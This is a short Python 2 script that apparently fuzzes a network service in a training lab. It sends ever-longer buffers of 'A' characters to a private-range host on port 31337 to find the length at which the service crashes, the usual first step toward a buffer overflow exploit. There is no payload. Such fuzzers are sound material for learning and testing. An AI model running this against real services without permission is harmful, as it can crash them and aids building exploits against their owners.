import socket
import time
print "\nFuzz buffer..."


buffer = "A" * 500

while len(buffer) < 10000: 
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("10.10.154.65", 31337))
	s.send(buffer)
	s.recv(1024)
	s.close()
	print "Sent length -> %s" % len(buffer)
	time.sleep(1)
#	exit()
#	raw_input()
	buffer = buffer + "A" * 10

print "\nDone!"
